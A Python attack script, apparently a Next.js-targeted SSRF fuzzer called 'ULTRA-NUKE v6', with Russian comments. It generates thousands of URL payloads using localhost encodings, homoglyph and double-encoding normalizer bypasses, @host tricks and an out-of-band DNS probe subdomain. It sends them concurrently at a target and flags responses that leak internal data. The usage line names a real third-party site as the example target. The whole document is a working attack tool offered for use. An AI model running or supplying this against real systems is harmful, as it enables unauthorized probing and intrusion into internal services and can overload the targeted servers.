#!/usr/bin/env python3
# Next15 ULTRA-NUKE v6 — The Final Weapon
# Author: Mark Effect + AI TurboForge

import aiohttp
import asyncio
import random
import string
import json
import re
import urllib.parse
import time

CONCURRENCY = 120     # можно поднять до 500
TIMEOUT = 6
UA = "Next15-ULTRA-NUKE-v6"
SEM = asyncio.Semaphore(CONCURRENCY)


def rand_tag():
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))


def dns_probe_domain(base_domain):
    """Формируем уникальный субдомен для DNS-доказательств SSRF."""
    tag = rand_tag()
    return f"{tag}.{base_domain}", tag


def normalize_variants(url):
    """Мультикодирование — 12 уровней обходов URL-normalizer."""
    enc = urllib.parse.quote(url)
    enc2 = urllib.parse.quote(enc)
    return list(set([
        url,
        url.replace("/", "%2f"),
        url.replace("/", "//"),
        enc,
        enc2,
        urllib.parse.unquote(url),
        url.replace("http", "h%74tp"),
        url.replace(":", "%3a"),
        url.replace(":", "꞉"), # homoglyph
        url.replace("/", "／"), # fullwidth slash
        url.replace("/", "%ef%bc%8f"),
        url.replace("127.0.0.1", "0177.0.0.1"),
    ]))


def build_payloads(target_host, dns_sub):
    """Генерируем 2400+ payloads."""
    localhostSet = [
        "127.0.0.1", "127.0.0.1:80", "127.0.0.1:3000",
        "localhost", "::1", "0.0.0.0",
        "2130706433", "0x7f000001", "017700000001",
    ]

    schemes = [
        "http://", "https://", "HttP://", "http:/", "http:////",
        "http:%2F%2F", "h%74tp://"
    ]

    slashes = [
        "/", "//", "///", "////", "%2f", "%2F", "%5C", "%255C",
        "／", "＼", "%ef%bc%8f"
    ]

    dirs = [
        "", "/?", "/redirect?u=", "/fetch?url=", "/go/", "/~root/", "/api/img?src=",
        "/#/", "/?next=", "/?u="
    ]

    finals = []

    # SSRF to localhost variants
    for host in localhostSet + [dns_sub]:
        for sc in schemes:
            for sl in slashes:
                for d in dirs:
                    base = f"{sl}{sc}{host}{d}{rand_tag()}"
                    finals.extend(normalize_variants(base))

    # @host tricks
    for host in localhostSet + [dns_sub]:
        finals.append(f"//@{host}")
        finals.append(f"/\\@{host}")
        finals.append(f"/?x=@{host}")
        finals.append(f"/?url=@{host}")
        finals.append(f"http://foo.com@{host}")

    return list(set(finals))


async def fetch(session, url):
    try:
        async with SEM:
            async with session.get(url, timeout=TIMEOUT, allow_redirects=False) as resp:
                text = await resp.text(errors="ignore")
                return resp.status, dict(resp.headers), text
    except:
        return None, None, None


def classify(resp_text, baseline_len, dns_tag):
    if resp_text is None:
        return []

    t = resp_text.lower()
    ind = []

    # DNS probe detection
    if dns_tag in t:
        ind.append("dns_probe_echo")

    if "127.0.0.1" in t or "localhost" in t:
        ind.append("internal_leak")

    if "/etc/passwd" in t:
        ind.append("file_leak")

    if len(resp_text) < baseline_len * 0.4:
        ind.append("length_anomaly_low")

    if len(resp_text) > baseline_len * 2.0:
        ind.append("length_anomaly_high")

    if "error connecting to" in t:
        ind.append("ssrf_attempt_visible")

    return ind


async def run_test(base_url, dns_base):
    async with aiohttp.ClientSession(headers={"User-Agent": UA}) as session:
        
        # Baseline response
        status, h, text = await fetch(session, base_url)
        baseline_len = len(text or "")
        print(f"[+] Baseline status={status}, len={baseline_len}")

        dns_sub, dns_tag = dns_probe_domain(dns_base)
        print(f"[+] DNS SSRF probe domain: {dns_sub}")
        print(f"[+] DNS TAG: {dns_tag}")

        payloads = build_payloads(base_url, dns_sub)
        print(f"[+] Payloads generated: {len(payloads)}")

        tasks = []
        for p in payloads:
            url = base_url.rstrip("/") + p
            tasks.append((p, asyncio.create_task(fetch(session, url))))

        findings = []

        for p, task in tasks:
            status, headers, text = await task
            indicators = classify(text, baseline_len, dns_tag)
            if indicators:
                findings.append((p, status, indicators))

        print("\n=========== RESULTS ===========")
        for p, s, ind in findings:
            print(f"\n[payload]: {p}\n  status={s}\n  indicators={ind}")

        print("\n=========== SUMMARY ===========")
        print(f"Total suspicious: {len(findings)}")
        return findings


if __name__ == "__main__":
    import sys

    if len(sys.argv) != 3:
        print("Usage: python next15_ultranuke_v6.py <target_url> <dns_prove_domain>")
        print("Example: python next15_ultranuke_v6.py https://demo.djangocfg.com oast.pro")
        exit(1)

    target = sys.argv[1]
    dns_domain = sys.argv[2]

    asyncio.run(run_test(target, dns_domain))
